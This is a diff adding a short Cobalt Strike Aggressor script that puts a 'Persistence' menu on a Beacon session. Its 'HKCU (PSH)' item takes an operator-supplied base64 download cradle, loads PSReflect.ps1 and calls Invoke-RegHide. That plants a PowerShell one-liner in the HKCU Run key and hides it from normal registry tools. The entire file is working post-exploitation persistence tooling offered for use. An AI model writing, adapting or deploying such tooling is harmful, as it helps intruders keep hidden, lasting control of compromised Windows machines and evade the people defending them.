@@ -1,0 +1,32 @@
+sub hkcu_psh {
+
+	$bid = $1;
+
+	$dialog = dialog("HKCU (PSH) Persistence", $null, lambda({
+
+		$cradle = $3["cradle"];
+
+		btask($bid, "Tasked Beacon to persist via HKCU (PSH)");
+
+		$script = getFileProper(script_resource("persistence\\modules"), "PSReflect.ps1");
+		bpowershell_import($bid, $script);
+
+		bpowerpick($bid, "Invoke-RegHide -Verbose -Cradle \" $+ $cradle $+ \"");
+
+	}));
+
+	dialog_description($dialog, "Create a PowerShell oneliner at HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run, hidden using PSReflect.");
+	
+	drow_text($dialog, "cradle", "Download Cradle (b64'd): ");
+	dbutton_action($dialog, "Let's Rumble");
+	dialog_show($dialog);
+
+}
+
+popup beacon_bottom {
+	menu "Persistence" {
+		item "HKCU (PSH)" {
+			hkcu_psh($1);
+		}
+	}
+}
